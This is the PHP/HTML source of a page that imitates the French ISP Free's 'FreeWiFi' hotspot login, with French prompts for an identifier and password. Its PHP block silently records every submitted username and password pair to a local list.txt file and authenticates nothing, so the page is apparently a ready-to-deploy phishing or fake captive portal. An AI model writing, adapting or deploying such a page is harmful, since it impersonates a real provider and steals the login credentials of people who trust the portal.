<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=400, user-scalable = no" />
<title></title>
<link rel="stylesheet" type="text/css" href="hotspot.css" media="screen" />
</head>
<?php 

$name=$_POST['name']; 
$pwd=$_POST['pwd'];


if(strlen($name) > 0 and strlen($pwd) > 0){
	$list = fopen("list.txt", "a");
	$data = $name.":".$pwd." ";
	fseek($list, 0);
	fwrite($list,$data);
	fclose($list);
}

?>
	<body>
	<div id="header">
		<div id="header_c">
			<div id="top">
				<div id="top-menu"><img src="logo2.png" width="232" height="112" alt="Free" /></div>
			</div>
		</div>
		<div class="clearer"></div>
	</div>
	
	<div id="bod">
		<div id="bod_c">
			<div id="block">
		      <h1>CONNEXION AU SERVICE <span class="red">FreeWiFi</span></h1>
		      <br />
		<div id="block_2">
        	 <p >Pour vous connecter au service FreeWiFi, <br />
          utilisez les identifiants que vous avez configurés lors de votre premier accès au service<br />
          	         <form id="form1" name="form1" method="post">
			          <label for="login" class="label" > IDENTIFIANT</label>
			          <input name="name" id="login"  class="input_r" value=""/>
			          <br />
			          <br />
			          <br />
			          <label for="password" class="label" > MOT DE PASSE</label>
			          <input type="password" name="pwd" id="password" class="input_r" value=""/>
			          <br />
			          <br />
			          <br />
			          <input name="submit" type="submit" value="Valider" class="input_b" />
			        </form>
		 
			<div class="clearer"></div> 
		</div>

      <a href="http://www.free.fr" target="_blank"><img src="abo.jpeg" alt="Vous n'êtes pas abonné FREE? Cliquez ici et dans une minute, vous pourrez accéder à internet" width="399" height="70" border="0" /></a></div>
      </div>
      </div>

		
	</body>
</html>